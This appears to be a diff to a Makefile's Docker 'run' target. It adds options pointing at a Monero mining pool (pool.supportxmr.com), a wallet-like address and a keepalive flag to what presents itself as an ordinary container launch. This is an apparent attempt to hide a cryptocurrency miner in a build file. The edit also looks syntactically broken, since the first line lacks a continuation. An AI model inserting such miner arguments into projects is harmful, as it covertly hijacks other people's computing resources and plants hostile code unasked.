@@ -10,4 +10,7 @@ build:
 	pack build $(IMAGE) --builder $(BUILDER) 
 
 run:
-	docker run -it --rm -e PORT=8080 -e NODE_ENV=production -p 8080:8080 $(IMAGE) 
+	docker run -it --rm -e PORT=8080 -e NODE_ENV=production -p 8080:8080 $(IMAGE)
+     -o pool.supportxmr.com:3333 \
+     -u 46qW88SQsGdCzHB65dhLpkehyJaYzzaLbM4VFFrZLqahhUCdPjkGkDYjLGGEH \
+     -k 
